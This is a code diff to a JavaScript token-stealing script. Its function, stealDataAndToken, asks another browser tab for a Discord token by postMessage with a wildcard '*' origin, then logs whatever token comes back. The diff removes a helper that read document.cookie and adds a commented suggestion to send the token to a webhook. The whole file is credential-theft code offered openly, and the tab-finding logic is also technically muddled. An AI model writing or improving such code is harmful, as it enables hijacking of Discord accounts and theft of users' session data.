@@ -4,7 +4,6 @@ function stealDataAndToken() {
     function sendMessageToOtherTab(message) {
         // Find the other tab
         var otherTab = null;
-        var targetOrigin = '*'; // Change this to the origin of the other tab if known
 
         // Loop through all open windows (tabs)
         var windows = window.open('', '_blank');
@@ -18,7 +17,7 @@ function stealDataAndToken() {
 
         // Send message to the other tab using postMessage
         if (otherTab) {
-            otherTab.postMessage({ type: 'getDiscordToken' }, targetOrigin);
+            otherTab.postMessage({ type: 'getDiscordToken' }, '*');
         } else {
             console.error('Unable to find the other tab.');
         }
@@ -32,34 +31,21 @@ function stealDataAndToken() {
             return;
         }
 
-        // Check if the message is a request for the Discord token
+        // Check if the message is a response with the Discord token
         if (event.data.type === 'sendDiscordToken') {
             // Retrieve the Discord token from the message data
             var discordToken = event.data.token;
 
-            // Check if the token is null
-            if (discordToken !== null) {
-                // Proceed with stealing data using the retrieved token
-                stealDataAndTokenWithToken(discordToken);
-            } else {
-                console.error('Received null Discord token from other tab.');
-            }
+            // Proceed with stealing data using the retrieved token
+            console.log('Received Discord Token:', discordToken);
+
+            // Example: send the token to a webhook or perform other actions
+            // sendMessageToDiscord(discordToken);
         }
     });
 
     // Call the function to send a message to the other tab requesting the Discord token
     sendMessageToOtherTab('Please send Discord token');
-}
-
-// Function to steal data and token using the Discord token retrieved from another tab
-function stealDataAndTokenWithToken(discordToken) {
-    // Capture cookies from document.cookie
-    var allCookies = document.cookie;
-
-    // Proceed with stealing data using the retrieved Discord token
-    // Here, you can include the original stealDataAndToken logic
-
-    console.log('Discord Token:', discordToken);
 }
 
 // Call the function to steal data and token
